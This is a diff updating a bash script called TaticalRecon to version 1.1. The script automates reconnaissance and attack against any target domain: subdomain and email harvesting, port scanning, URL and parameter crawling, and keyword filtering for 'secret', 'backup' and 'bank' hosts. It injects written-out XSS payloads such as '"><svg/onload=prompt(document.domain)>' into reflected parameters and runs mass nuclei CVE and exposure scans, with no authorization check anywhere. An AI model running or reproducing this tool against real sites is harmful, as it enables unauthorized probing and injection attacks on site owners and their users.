@@ -7,7 +7,7 @@ function banner {
         clear
         figlet -c -f slant tatical-recon | lolcat
         echo "            Coded By: HunterDep" | lolcat
-        echo "            Version: 1.0" | lolcat
+        echo "            Version: 1.1" | lolcat
         echo "            Command Help: -h" | lolcat
         echo "            Target: $site" | lolcat
         echo
@@ -15,30 +15,34 @@ function banner {
 banner
 
 if echo $* | grep '\-h' -q;then
-        echo "TaticalRecon 1.0: Help"
+        echo "TaticalRecon 1.1: Help"
         echo '-all-apis:      Use -all of subfinder.'
         echo '-th:      Use theHarvesterTool.'
         echo '-gen:      Use DnsGen to Recon.'
         echo '-wilcards:      Recon on Wilcards'
+        echo '-urls:      Recon on Urls'
         echo;echo "Scans:"
         echo '-nrich:      CVE Scan on IPS with Nrich'
         echo '-iis-scan:      Find IIS (Windows Server)'
         echo '-firebase-scan:      Find Firebase'
         echo '-js-scan:      Scan JavaScript files with Nuclei'
         echo '-wp-recon:      Recon on WordPress subdomains and vulnerabilities.'
-        echo '-cpanel-scan:      Recon o cPanel'
+        echo '-cpanel-scan:      Recon on cPanel'
         echo '-nuclei-fuzzer:      Fuzzing on Parameters with Fuzzing-Templates'
         exit;
 fi
 
 echo "=====[ Subdomains Recon ]====="
-sublist3r -d $site -o subs.rs
+subdominator -d $site -o subs.rs
+sublist3r -d $site -n | grep $site | grep -v '[-]' | anew subs.rs
 shodanx subdomain -d $site -o shodan-subs.rs ; cat shodan-subs.rs | grep $site | anew subs.rs
 echo $site | assetfinder --subs-only | anew subs.rs
 findomain -t $site -q | anew subs.rs
 echo $site | haktrails subdomains | anew subs.rs
 chaos-client -d $site --silent | anew subs.rs
 listdomains -d $site --subs --silent | anew subs.rs
+
+cat subs.rs | grep '@' | anew -q emails.txt
 
 if echo $* | grep '\-all-apis' -q;then
         banner
@@ -51,6 +55,7 @@ if echo $* | grep '\-th' -q;then
         banner
         echo "=====[ TheHarvester Recon ]====="
         theHarvester -d $site -l 500 -b all -s -f havt
+        cat havt.json | jq '."asns".[]' | tr -d '"' | tr ':' '\n' | anew asns.txt
         cat havt.json | jq '."hosts".[]' | tr -d '"' | tr ':' '\n' | grep $site$ | anew subs.rs
         cat havt.json | jq '."emails".[]' | tr -d '"' | tr ':' '\n' | anew emails.txt
 fi
@@ -87,16 +92,16 @@ fi
 
 banner
 echo "=====[ IPS Recon ]====="
-cat subs.rs | dnsx -a --resp-only --silent | anew ips.rs
 cat subs.rs | dnsx -a --resp --silent | anew domain_ips.rs
+cat domain_ips.rs | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" | awk '{ print $3 }' | tr -d '[]' | anew ips.rs
 
 banner
 echo "=====[ PortScan ]====="
 naabu -list ips.rs -p $ports -c 150 --silent -o portscan.txt
 
 banner
-echo "=====[ Live Subdomains ]====="
-cat subs.rs | httpx --silent -t 100 | anew vivos.rs
+echo "=====[ Live Targets ]====="
+cat subs.rs | grep -v '@' | httpx --silent -t 100 | anew vivos.rs
 cat portscan.txt | httpx --silent -t 100 | anew vivos.rs
 cat vivos.rs | httpx --silent --title -location -td | anew techs.rs
 
@@ -106,40 +111,45 @@ if echo $* | grep '\-nrich' -q;then
         cat ips.rs | nrich -o json - | anew ips-scan.nrich
 fi
 
-banner
-echo "=====[ URL Recon ]====="
-cat vivos.rs | katana --passive --silent | anew urls.cd
-paramspider -d $site ; cat output/* | anew params.cd
-rm -rf output/
+if echo $* | grep '\-url' -q;then
+        banner
+        echo "=====[ URL Recon ]====="
+        cat vivos.rs | katana --passive --silent | anew urls.cd
+        paramspider -d $site ; cat output/* | anew params.cd
+        rm -rf output/
 
-cat vivos.rs | gauplus | anew urls.cd
-cat vivos.rs | waybackurls | anew urls.cd
-cat vivos.rs | hakrawler | anew urls.cd
+        cat vivos.rs | waybackurls | anew urls.cd
+        cat vivos.rs | katana -xhr -jc -fx -kf all --silent | anew urls.cd
 
-banner
-echo "=====[ Param Recon ]====="
-cat urls.cd | grep '?' | qsreplace 'FUZZ' | anew -q params.cd
-cat params.cd | gf xss | anew -q xss.gf
-cat params.cd | gf sqli | anew -q sqli.gf
-cat params.cd | gf redirect | anew -q redirect.gf
-cat params.cd | gf idor | anew -q idor.gf
-cat params.cd | gf lfi | anew -q lfi.gf
-cat urls.cd | grep '\.js' | grep $site | qsreplace | anew -q js.cd
+        banner
+        echo "=====[ Param Recon ]====="
+        cat urls.cd | grep '?' | qsreplace 'FUZZ' | anew -q params.cd
+        cat params.cd | gf xss | anew -q xss.gf
+        cat params.cd | gf sqli | anew -q sqli.gf
+        cat params.cd | gf redirect | anew -q redirect.gf
+        cat params.cd | gf idor | anew -q idor.gf
+        cat params.cd | gf lfi | anew -q lfi.gf
+        cat urls.cd | grep '\.js' | grep $site | qsreplace | anew -q js.cd
 
-cat params.cd | qsreplace 'kalirfl' | httpx --silent -ms 'kalirfl' -o refletidos.cd -t 75
-cat refletidos.cd | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew airi.xss
-cat refletidos.cd | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew airi.xss
-cat refletidos.cd | qsreplace '"></script><hTMl onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew airi.xss
-cat refletidos.cd | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew airi.xss
+        cat params.cd | qsreplace 'kalirfl' | httpx --silent -ms 'kalirfl' -o refletidos.cd -t 75
+        cat refletidos.cd | qsreplace '"><svg/onload=prompt(document.domain)>' | airixss -p 'prompt(document.domain)' | egrep -v 'Not' | anew airi.xss
+        cat refletidos.cd | qsreplace '"><img src=IDONTNO onError=confirm(1337)>' | airixss -p 'confirm(1337)>' | egrep -v 'Not' | anew airi.xss
+        cat refletidos.cd | qsreplace '"></script><hTMl/onmouseovER=prompt(1447)>' | airixss -p 'onmouseovER=prompt(1447)>' | egrep -v 'Not' | anew airi.xss
+        cat refletidos.cd | qsreplace '"><iframe src=x>' | airixss -p 'src=x>' | egrep -v 'Not' | anew airi.xss
+        cat refletidos.cd | qsreplace 'x" onmouseover=prompt(1447)>' | airixss -p 'prompt(1447)' | egrep -v 'Not' | anew airi.xss
 
-cat airi.xss | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > vuln-injections.txt
+        cat airi.xss | awk '{ print $3 }' | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > vuln-injections.txt
+fi
+
+mkdir "Suspects/"
+cat subs.rs | grep 'adm\|secret\|confi\|api\|key\|sql\|db\|database\|cash\|dev\|backup\|old\|new\|bank\|add\|edit\|remove\|account' -i | anew Suspects/subs-sus.txt
+cat vivos.rs | grep 'adm\|secret\|confi\|api\|key\|sql\|db\|database\|cash\|dev\|backup\|old\|new\|bank\|add\|edit\|remove\|account' -i | anew Suspects/vivos-sus.txt
 
 ######################### SCANS ########################################33##################
-
 if echo $* | grep '\-iis-scan' -q;then
         banner
         echo "=====[ IIS Scan (Nuclei) ]====="
-        nuclei --list vivos.rs -t http/technologies/microsoft/microsoft-iis-version.yaml --output iis-scan.nucl --silent
+        nuclei --list vivos.rs -tags iis --output iis-scan.nucl --silent
 fi
 if echo $* | grep '\-firebase-scan' -q;then
         banner
@@ -156,7 +166,7 @@ if echo $* | grep '\-wp-recon' -q;then
         echo "=====[ WordPress Recon (Nuclei) ]====="
         cat vivos.rs | nuclei -t http/technologies/wordpress-detect.yaml --silent -c 75 -o wordpress-subs.nucl
         echo;echo "=====[ WordPress Vulnerabilities ]====="
-        cat wordpress-subs.nucl | awk '{ print $4 }' | unfurl domains | anew | nuclei -t http/vulnerabilities/wordpress/ --silent -c 80 -o wordpress-vulns.nucl
+        cat wordpress-subs.nucl | awk '{ print $4 }' | unfurl domains | grep $site | anew | nuclei -tags wordpress,wp --silent -c 80 -o wordpress-vulns.nucl
 fi
 if echo $* | grep '\-cpanel-scan';then
         banner
@@ -175,7 +185,7 @@ banner
 echo "=====[ Nuclei Scan ]====="
 mkdir Nuclei-Tests
 
-cat vivos.rs | nuclei -tags generic --silent -o generic-scan.nucl -c 100
+cat vivos.rs | nuclei -t http/vulnerabilities/generic/ --silent -o generic-scan.nucl -c 100
 cat vivos.rs | nuclei -tags cve,cves,cve2000,cve2001,cve2002,cve2003,cve2004,cve2005,cve2006,cve2007,cve2008,cve2009,cve2010,cve2011,cve2012,cve2013,cve2014,cve2015,cve2016,cve2017,cve2018,cve2019,cve2020,cve2021,cve2022,cve2023,cve2024,cve02024,cnvd -c 125 --silent -o nuclei-cve-scan.nucl
 cat vivos.rs | nuclei -t ~/nco/nucl-ant/ -t ~/nco/pikpikcu -es info --silent -o nuclei-old-scan.nucl -c 150
 cat vivos.rs | nuclei -tags exposure,misconfig,config,phpinfo,git,env --silent -o nuclei-exposure-scan.nucl -c 150 -es info
